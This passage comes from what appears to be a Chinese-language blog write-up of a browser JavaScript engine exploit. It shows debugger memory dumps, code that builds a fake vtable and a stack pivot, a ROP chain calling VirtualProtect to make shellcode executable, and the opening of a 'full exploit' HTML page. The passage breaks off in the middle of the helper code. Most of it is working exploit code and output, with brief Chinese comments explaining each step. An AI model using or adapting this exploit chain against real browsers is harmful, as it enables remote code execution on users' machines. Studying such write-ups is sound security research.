5941</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffb&#96;472db44c  5941 90c3 5141 4850 ec83 f320 7f0f 2434  AY..AQPH.. ...4$</span><br></pre></td></tr></table></figure><h3 id="创建一块大的可读写空间，fake-vtable和栈伪造，栈劫持和mprotect执行shellcode"><a href="#创建一块大的可读写空间，fake-vtable和栈伪造，栈劫持和mprotect执行shellcode" class="headerlink" title="创建一块大的可读写空间，fake vtable和栈伪造，栈劫持和mprotect执行shellcode"></a>创建一块大的可读写空间，fake vtable和栈伪造，栈劫持和mprotect执行shellcode</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> scratch = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">let</span> scratch_u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(scratch);</span><br><span class="line"><span class="keyword">let</span> scratch_u64 = <span class="keyword">new</span> BigUint64Array(scratch);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">let</span> scratch_addr = readPtr(offset, scratch_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span><br><span class="line">scratch_u64.fill(gadget, <span class="number">0</span>, <span class="number">100</span>);<span class="comment">//把其首部当做fake_vtab，在virtual call执行的时候会执行这里面的语句，于是跳转到gadget执行，这个gadget用于栈劫持,此时rcx的值应为el_addr的地址。</span></span><br><span class="line"><span class="keyword">let</span> fake_vtab = scratch_addr;</span><br><span class="line">...</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x10</span>).asDouble(), fake_stack); <span class="comment">// RSP</span></span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x50</span>).asDouble(), pop_rcx_ret + <span class="keyword">new</span> Int64(<span class="number">0x1</span>).asDouble()); <span class="comment">// RIP = ret</span></span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x58</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x60</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x68</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr, fake_vtab);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">00007</span>ff9<span class="string">`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]</span></span><br><span class="line"><span class="string">00007ff9`</span><span class="number">296</span>f0709 <span class="number">488</span>b6918        mov     rbp,qword ptr [rcx+<span class="number">18</span>h]</span><br><span class="line"><span class="number">00007</span>ff9<span class="string">`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h] //改变rsp的值为fake_stack</span></span><br><span class="line"><span class="string">00007ff9`</span><span class="number">296</span>f0711 ffe2            jmp     rdx <span class="comment">//改变rip到一个ret指令</span></span><br></pre></td></tr></table></figure><p>栈劫持之后，开始执行我们的mprotect gadaget，使shellcode所在的页可执行，然后跳转到shellcode执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_stack = scratch_addr + <span class="keyword">new</span> Int64(<span class="number">0x10000</span>).asDouble();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> stack = [</span><br><span class="line">    pop_rcx_ret,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="number">0x1000</span>).asDouble(),</span><br><span class="line">    pop_r8_ret,</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="number">0x40</span>).asDouble(),</span><br><span class="line">    pop_r9_ret,</span><br><span class="line">    scratch_addr,</span><br><span class="line">    virtaulprotect_addr, <span class="comment">// VirtualProtect</span></span><br><span class="line">    sc_addr,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stack.length; ++i) &#123;</span><br><span class="line">    scratch_u64[<span class="number">0x10000</span>/<span class="number">8</span> + i] = stack[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">String</span>.prototype.padLeft =</span></span><br><span class="line"><span class="javascript"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> res = [];</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//console.log(bytes[i].toString(16));</span></span></span><br><span class="line"><span class="actionscript">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span><span class="params">(hexstr)</span> </span>&#123;</span></span><br><span class="line">    if (hexstr.length % 2 == 1)</span><br><span class="line"><span class="javascript">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span></span><br><span class="line"><span class="javascript">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> bytes;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span></span><br><span class="line"><span class="javascript">        data = <span class="built_in">Array</span>.from(data);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> lines = [];</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> parts = chunk.map(hex);</span></span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line"><span class="actionscript">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span></span><br><span class="line"><span class="actionscript">        lines.push(parts.join(<span class="string">' '</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Simplified version of the similarly named python module.</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">        pack: <span class="function"><span class="keyword">function</span><span class="params">(type, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span></span><br><span class="line">            view[0] = value;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        unpack: <span class="function"><span class="keyword">function</span><span class="params">(type, bytes)</span> </span>&#123;</span></span><br><span class="line">            if (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line"><span class="javascript">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> view[<span class="number">0</span>];</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">// Available types.</span></span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span><span class="params">(v)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// The underlying byte array.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'number'</span>:</span></span><br><span class="line"><span class="javascript">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'string'</span>:</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span></span><br><span class="line">                v = v.substr(2);</span><br><span class="line">            if (v.length % 2 == 1)</span><br><span class="line"><span class="actionscript">                v = <span class="string">'0'</span> + v;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//console.log(bigEndian.toString());</span></span></span><br><span class="line"><span class="javascript">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'object'</span>:</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span></span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line"><span class="actionscript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">                if (v.length != 8)</span><br><span class="line"><span class="javascript">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span></span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// Check for NaN</span></span></span><br><span class="line">        if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe))</span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// due to double conversion constraints.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">        if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff))</span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> res;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return the underlying bytes of this number as array.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return the byte at the given index.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span><span class="params">(i)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bytes[i];</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//console.log("toString");</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Basic arithmetic.</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span><span class="params">(f, nargs)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span></span><br><span 